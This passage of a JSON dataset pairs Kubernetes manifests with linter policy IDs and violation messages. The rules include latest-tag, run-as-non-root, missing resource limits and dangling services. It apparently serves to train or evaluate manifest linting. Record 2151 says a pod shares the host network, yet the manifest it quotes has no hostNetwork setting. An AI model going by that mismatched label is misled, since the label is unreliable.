    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-udp-ingress-lb\" does not have a read-only root file system"
  },
  {
    "id": "2124",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"nginx-udp-ingress-lb\" does not expose port 10254 for the HTTPGet"
  },
  {
    "id": "2125",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-udp-ingress-lb\" is not set to runAsNonRoot"
  },
  {
    "id": "2126",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-udp-ingress-lb\" has cpu request 0"
  },
  {
    "id": "2127",
    "manifest_path": "data/manifests/the_stack_sample/sample_0523.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-udp-ingress-controller\n  labels:\n    k8s-app: nginx-udp-ingress-lb\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-udp-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-udp-ingress-lb\n        name: nginx-udp-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.9.0-beta.13\n        name: nginx-udp-ingress-lb\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        - containerPort: 9001\n          hostPort: 9001\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        - --udp-services-configmap=$(POD_NAMESPACE)/nginx-udp-ingress-configmap\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-udp-ingress-lb\" has memory limit 0"
  },
  {
    "id": "2128",
    "manifest_path": "data/manifests/the_stack_sample/sample_0526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2129",
    "manifest_path": "data/manifests/the_stack_sample/sample_0526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2130",
    "manifest_path": "data/manifests/the_stack_sample/sample_0526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2131",
    "manifest_path": "data/manifests/the_stack_sample/sample_0526.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: fungusappdeployment\n  labels:\n    appgungus: api\nspec:\n  selector:\n    matchLabels:\n      octopusexport: OctopusExport\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        appgungus: api\n        octopusexport: OctopusExport\n    spec:\n      containers:\n      - name: nginx\n        image: nginx\n        ports:\n        - containerPort: 80\n      securityContext:\n        runAsNonRoot: true\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: app\n                  operator: In\n                  values:\n                  - web\n              topologyKey: kubernetes.io/hostname\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2132",
    "manifest_path": "data/manifests/the_stack_sample/sample_0527.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: machine-approver\n  namespace: openshift-cluster-machine-approver\n  annotations:\n    service.alpha.openshift.io/serving-cert-secret-name: machine-approver-tls\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\n  labels:\n    app: machine-approver\nspec:\n  type: ClusterIP\n  clusterIP: None\n  ports:\n  - name: https\n    port: 9192\n    targetPort: https\n  selector:\n    app: machine-approver\n  sessionAffinity: None\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:machine-approver])"
  },
  {
    "id": "2133",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox1\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2134",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox2\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2135",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox1\" does not have a read-only root file system"
  },
  {
    "id": "2136",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox2\" does not have a read-only root file system"
  },
  {
    "id": "2137",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox1\" is not set to runAsNonRoot"
  },
  {
    "id": "2138",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox2\" is not set to runAsNonRoot"
  },
  {
    "id": "2139",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox1\" has cpu request 0"
  },
  {
    "id": "2140",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox2\" has cpu request 0"
  },
  {
    "id": "2141",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox1\" has memory limit 0"
  },
  {
    "id": "2142",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox2\" has memory limit 0"
  },
  {
    "id": "2143",
    "manifest_path": "data/manifests/the_stack_sample/sample_0529.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-example\nspec:\n  containers:\n  - image: scheele/reverseproxy\n    name: reverseproxy\n    imagePullPolicy: Always\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 1024Mi\n        cpu: 500m\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"reverseproxy\" is using an invalid container image, \"scheele/reverseproxy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2144",
    "manifest_path": "data/manifests/the_stack_sample/sample_0529.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-example\nspec:\n  containers:\n  - image: scheele/reverseproxy\n    name: reverseproxy\n    imagePullPolicy: Always\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 1024Mi\n        cpu: 500m\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"reverseproxy\" does not have a read-only root file system"
  },
  {
    "id": "2145",
    "manifest_path": "data/manifests/the_stack_sample/sample_0529.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-example\nspec:\n  containers:\n  - image: scheele/reverseproxy\n    name: reverseproxy\n    imagePullPolicy: Always\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 1024Mi\n        cpu: 500m\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"reverseproxy\" is not set to runAsNonRoot"
  },
  {
    "id": "2146",
    "manifest_path": "data/manifests/the_stack_sample/sample_0531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "2147",
    "manifest_path": "data/manifests/the_stack_sample/sample_0531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"statusreconciler\" not found"
  },
  {
    "id": "2148",
    "manifest_path": "data/manifests/the_stack_sample/sample_0531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "2149",
    "manifest_path": "data/manifests/the_stack_sample/sample_0531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "2150",
    "manifest_path": "data/manifests/the_stack_sample/sample_0531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "2151",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "2152",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "latest-tag",
